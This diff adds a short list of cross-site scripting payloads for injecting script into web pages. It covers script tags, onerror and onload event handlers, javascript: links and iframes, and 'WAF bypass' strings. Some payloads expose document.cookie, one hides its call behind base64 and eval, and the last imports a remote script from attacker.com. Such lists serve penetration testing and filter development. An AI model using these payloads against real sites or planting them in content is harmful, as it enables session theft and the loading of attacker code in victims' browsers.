@@ -1,0 +1,18 @@
+# Cross-Site Scripting Payloads
+
+# Basic Reflexive/Stored
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+
+# Event Handlers (HTML tags)
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+# Markdown / JavaScript URIs
+[Click](javascript:alert(document.cookie))
+<iframe src="javascript:alert(1)"></iframe>
+
+# WAF Bypass
+<svg/onload=eval(atob('YWxlcnQoMSk='))>
+<img src=x onerror="this.onerror=null;import('http://attacker.com/xss.js')">
